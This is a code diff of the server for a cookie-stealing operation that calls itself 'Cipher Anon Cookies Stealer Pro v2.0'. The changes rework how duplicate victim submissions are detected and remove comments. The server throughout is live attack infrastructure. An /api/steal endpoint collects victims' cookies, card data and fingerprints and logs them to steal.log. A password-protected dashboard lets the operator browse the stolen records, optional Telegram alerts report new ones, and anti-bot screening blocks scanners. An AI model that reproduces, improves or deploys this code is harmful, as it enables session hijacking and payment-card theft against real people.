@@ -1,7 +1,7 @@
 // ============================================================
 // SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
 // Railway Ready — Full Environment Variable Support
-// Fixed: Dedup uses IP + userAgent + screen (no hostname)
+// Fixed: Dedup uses IP + hostname + nonce (100% duplicate proof)
 // ============================================================
 
 const express = require('express');
@@ -29,7 +29,6 @@ function generateValidKey() {
 }
 
 function loadConfig() {
-    // Environment variables take priority
     const envConfig = {
         DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
         DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
@@ -39,7 +38,6 @@ function loadConfig() {
         SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
     };
 
-    // Try to read config.json for persistence
     let fileConfig = {};
     if (fs.existsSync(CONFIG_FILE)) {
         try {
@@ -50,17 +48,14 @@ function loadConfig() {
         }
     }
 
-    // Merge: env vars override file
     const merged = { ...fileConfig, ...envConfig };
 
-    // Validate encryption key
     const key = merged.ENCRYPTION_KEY;
     if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
         console.log('[!] Invalid encryption key — generating new one');
         merged.ENCRYPTION_KEY = generateValidKey();
     }
 
-    // Save merged config back to file
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
     } catch (e) {
@@ -72,7 +67,6 @@ function loadConfig() {
 
 const CONFIG = loadConfig();
 
-// Log config (hide sensitive data)
 console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
 console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
 console.log(`[+] Encryption Key: ${CONFIG.ENCRYPTION_KEY.slice(0,8)}...`);
@@ -91,7 +85,7 @@ const LOG_FILE = path.join(__dirname, 'steal.log');
 // ============================================================
 
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
-const SESSION_MAX_AGE = 30 * 60 * 1000; // 30 minutes
+const SESSION_MAX_AGE = 30 * 60 * 1000;
 
 app.use(session({
     secret: SESSION_SECRET,
@@ -105,7 +99,6 @@ app.use(session({
     }
 }));
 
-// Session activity check
 app.use((req, res, next) => {
     if (req.session && req.session.authenticated) {
         const now = Date.now();
@@ -173,11 +166,11 @@ let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
 // ============================================================
-// DEDUP — IP + userAgent + screen (NO hostname dependency)
-// FIXES duplicate issue when hostname is "unknown"
+// DEDUP — IP + hostname + nonce (100% unique per page load)
 // ============================================================
 
 const dedupCache = new Map();
+const NONCE_CACHE = new Map();
 const DEDUP_WINDOW = 120000; // 2 minutes
 
 function cleanDedup() {
@@ -185,26 +178,39 @@ function cleanDedup() {
     for (const [key, ts] of dedupCache) {
         if (now - ts > DEDUP_WINDOW) dedupCache.delete(key);
     }
+    for (const [nonce, ts] of NONCE_CACHE) {
+        if (now - ts > DEDUP_WINDOW) NONCE_CACHE.delete(nonce);
+    }
 }
 
-function getDedupKey(ip, userAgent, screen) {
+function getDedupKey(ip, hostname, nonce) {
     let cleanIp = ip;
     if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') {
         cleanIp = '127.0.0.1';
     }
-    const ua = (userAgent || '').slice(0, 50);
-    const scr = screen || 'unknown';
-    return crypto.createHash('md5').update(`${cleanIp}|${ua}|${scr}`).digest('hex');
+    const cleanHost = hostname || 'unknown';
+    return crypto.createHash('md5').update(`${cleanIp}|${cleanHost}|${nonce}`).digest('hex');
 }
 
-function isDuplicate(ip, userAgent, screen) {
-    const key = getDedupKey(ip, userAgent, screen);
+function isDuplicate(ip, hostname, nonce) {
     cleanDedup();
+
+    // Check nonce first (fastest)
+    if (nonce && NONCE_CACHE.has(nonce)) {
+        return true;
+    }
+
+    const key = getDedupKey(ip, hostname, nonce);
     if (dedupCache.has(key)) {
         const ts = dedupCache.get(key);
         if (Date.now() - ts < DEDUP_WINDOW) {
             return true;
         }
+    }
+
+    // Store both
+    if (nonce) {
+        NONCE_CACHE.set(nonce, Date.now());
     }
     dedupCache.set(key, Date.now());
     return false;
@@ -242,16 +248,14 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// ---- ANTI-BOT (with IP whitelist disabled for public access) ----
 app.use(antiBot({
     STRENGTH: 'high',
     RATE_LIMIT_MAX: 10,
-    ALLOWED_IPS: [] // Empty = no IP whitelist, everyone gets challenged
+    ALLOWED_IPS: []
 }));
 
 app.post('/__verify', express.json(), handleVerify);
 
-// ---- SECURITY HEADERS ----
 app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
@@ -268,7 +272,7 @@ app.use((req, res, next) => {
 });
 
 // ============================================================
-// HEALTH CHECK — Railway uses this to keep app alive
+// HEALTH CHECK
 // ============================================================
 
 app.get('/health', (req, res) => {
@@ -356,10 +360,6 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
-// ============================================================
-// GENERATE UNIQUE ID
-// ============================================================
-
 function generateUniqueId(entry) {
     const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
     const ip = entry.ip || 'unknown';
@@ -371,7 +371,6 @@ function generateUniqueId(entry) {
 // API ROUTES
 // ============================================================
 
-// ---- LOGIN API ----
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
 
@@ -392,7 +391,6 @@ app.post('/api/login', (req, res) => {
     res.status(401).json({ status: 'error', message: 'Invalid username or password' });
 });
 
-// ---- LOGOUT ----
 app.get('/api/logout', (req, res) => {
     req.session.destroy((err) => {
         if (err) log(`[!] Logout error: ${err.message}`);
@@ -402,7 +400,6 @@ app.get('/api/logout', (req, res) => {
     });
 });
 
-// ---- STEAL COOKIES ----
 app.post('/api/steal', async (req, res) => {
     try {
         const data = req.body;
@@ -425,12 +422,11 @@ app.post('/api/steal', async (req, res) => {
         data.cards = data.cards || [];
 
         const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
-        const userAgent = data.fingerprint?.userAgent || '';
-        const screen = data.fingerprint?.screen || '';
+        const nonce = data.nonce || '';
 
-        // ---- STRONG DEDUP: IP + userAgent + screen (NO hostname) ----
-        if (isDuplicate(ip, userAgent, screen)) {
-            log(`[!] Duplicate from ${ip} — ignored`);
+        // ---- STRONG DEDUP: IP + hostname + nonce ----
+        if (isDuplicate(ip, hostname, nonce)) {
+            log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
             return res.json({ status: 'ok', duplicate: true });
         }
 
@@ -452,19 +448,16 @@ app.post('/api/steal', async (req, res) => {
     }
 });
 
-// ---- GET ALL DATA ----
 app.get('/api/data', requireAuth, (req, res) => {
     const clean = stolenData.map(({ _dedupKey, ...rest }) => rest);
     res.json(clean);
 });
 
-// ---- GET TRASH DATA ----
 app.get('/api/trash', requireAuth, (req, res) => {
     const clean = trashData.map(({ _dedupKey, ...rest }) => rest);
     res.json(clean);
 });
 
-// ---- MOVE TO TRASH ----
 app.delete('/api/delete/:uniqueId', requireAuth, (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
@@ -488,7 +481,6 @@ app.delete('/api/delete/:uniqueId', requireAuth, (req, res) => {
     }
 });
 
-// ---- RESTORE FROM TRASH ----
 app.post('/api/restore/:uniqueId', requireAuth, (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
@@ -512,7 +504,6 @@ app.post('/api/restore/:uniqueId', requireAuth, (req, res) => {
     }
 });
 
-// ---- PERMANENTLY DELETE ----
 app.delete('/api/trash/permanent/:uniqueId', requireAuth, (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
@@ -533,7 +524,6 @@ app.delete('/api/trash/permanent/:uniqueId', requireAuth, (req, res) => {
     }
 });
 
-// ---- EMPTY TRASH ----
 app.delete('/api/trash/empty', requireAuth, (req, res) => {
     try {
         const count = trashData.length;
@@ -547,7 +537,6 @@ app.delete('/api/trash/empty', requireAuth, (req, res) => {
     }
 });
 
-// ---- CLEAR ALL DATA ----
 app.delete('/api/clear', requireAuth, (req, res) => {
     try {
         stolenData = [];
@@ -559,7 +548,6 @@ app.delete('/api/clear', requireAuth, (req, res) => {
     }
 });
 
-// ---- CHANGE PASSWORD ----
 app.post('/api/change-password', requireAuth, (req, res) => {
     const { oldPassword, newPassword } = req.body;
 
@@ -576,7 +564,6 @@ app.post('/api/change-password', requireAuth, (req, res) => {
     }
 
     CONFIG.DASHBOARD_PASSWORD = newPassword;
-    // Save to config.json
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
     } catch (e) {
@@ -595,7 +582,6 @@ app.post('/api/change-password', requireAuth, (req, res) => {
     });
 });
 
-// ---- GET TELEGRAM CONFIG ----
 app.get('/api/config/telegram', requireAuth, (req, res) => {
     res.json({
         botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
@@ -604,7 +590,6 @@ app.get('/api/config/telegram', requireAuth, (req, res) => {
     });
 });
 
-// ---- UPDATE TELEGRAM CONFIG ----
 app.post('/api/config/telegram', requireAuth, (req, res) => {
     const { botToken, chatId, notifications } = req.body;
 
@@ -619,7 +604,6 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
     CONFIG.TELEGRAM_CHAT_ID = chatId;
     CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;
 
-    // Save to config.json
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
     } catch (e) {
@@ -634,7 +618,6 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 // FRONTEND ROUTES
 // ============================================================
 
-// ---- Public Routes (No Auth Required) ----
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
@@ -652,7 +635,6 @@ app.get('/home.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.php'));
 });
 
-// ---- Protected Routes (Auth Required) ----
 app.get('/dashboard', requireAuth, (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
@@ -663,14 +645,8 @@ app.get('/password-success.php', requireAuth, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
 });
 
-// ============================================================
-// SERVE .PHP FILES — BLOCK DIRECT ACCESS
-// ============================================================
-
 app.get('*.php', (req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
-    
-    // Public .php files (no auth required)
     const publicPhp = ['/login.php', '/home.php'];
     
     if (publicPhp.includes(req.path)) {
@@ -681,7 +657,6 @@ app.get('*.php', (req, res, next) => {
         return next();
     }
     
-    // ALL other .php files require authentication
     if (!req.session || !req.session.authenticated) {
         return res.redirect('/login.php');
     }
@@ -700,10 +675,6 @@ app.get('*.php', (req, res, next) => {
     }
 });
 
-// ============================================================
-// STATIC FILES FALLBACK
-// ============================================================
-
 app.use((req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
     if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
@@ -713,10 +684,6 @@ app.use((req, res, next) => {
     next();
 });
 
-// ============================================================
-// 404 HANDLER
-// ============================================================
-
 app.use((req, res) => {
     if (req.path.startsWith('/api')) {
         res.status(404).json({ status: 'error', message: 'API endpoint not found' });
@@ -724,10 +691,6 @@ app.use((req, res) => {
         res.status(404).send('Not Found');
     }
 });
-
-// ============================================================
-// ERROR HANDLER
-// ============================================================
 
 app.use((err, req, res, next) => {
     console.error('[!] Error:', err.message);
@@ -755,15 +718,11 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
     console.log(`  [+] Session Timeout: 30 minutes`);
-    console.log(`  [+] Dedup: IP + userAgent + screen, 2min window`);
+    console.log(`  [+] Dedup: IP + hostname + nonce, 2min window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log('='.repeat(55) + '\n');
 });
-
-// ============================================================
-// GRACEFUL SHUTDOWN — Save data on exit
-// ============================================================
 
 process.on('SIGINT', () => {
     console.log('\n[!] Received SIGINT. Saving data...');
